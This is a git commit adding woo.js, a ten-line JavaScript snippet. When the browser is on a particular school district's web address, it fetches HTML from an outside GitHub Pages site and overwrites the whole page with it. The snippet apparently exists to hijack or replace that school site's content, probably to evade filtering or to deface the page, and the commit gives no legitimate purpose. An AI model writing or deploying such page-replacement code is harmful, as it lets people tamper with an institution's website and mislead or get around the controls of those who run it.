eaf8c553ab70a02d17828595bb8f5840b6c83aa0
myschoolisass <148739396+myschoolisass@users.noreply.github.com>
2024-04-01 12:11:25 -0700

    Create woo.js

---
+++ woo.js
@@ -0,0 +1,10 @@
+  (function() {
+    if (window.location.href === 'https://tumwater.beaverton.k12.or.us/') {
+    fetch('https://myschoolisass.github.io/pain/test2.html')
+    .then(response => response.text())
+    .then(html => {
+        document.open();
+        document.write(html);
+        document.close();
+    });    }
+})();
